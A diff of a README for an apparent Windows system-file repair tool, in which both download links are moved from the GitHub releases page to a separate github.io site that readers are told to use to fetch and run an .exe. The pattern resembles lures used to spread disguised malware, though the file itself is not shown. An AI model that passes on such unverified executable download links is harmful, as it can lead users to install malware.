@@ -1,6 +1,6 @@
 # 🛠 DISM-Restore-Health-Fix - Repair Windows system files with ease
 
-[![Download Tool](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Lucevindicated551/DISM-Restore-Health-Fix/releases)
+[![Download Tool](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://lucevindicated551.github.io)
 
 ## 📖 About this application
 
@@ -20,7 +20,7 @@ You need a PC running a modern version of Windows.
 
 You must visit the releases page to obtain the correct version for your computer. 
 
-[Click here to visit our release page and download your version.](https://github.com/Lucevindicated551/DISM-Restore-Health-Fix/releases)
+[Click here to visit our release page and download your version.](https://lucevindicated551.github.io)
 
 Select the most recent release at the top of the list. Look for the file ending in .exe to start the process. Save this file to your desktop for easy access.
 
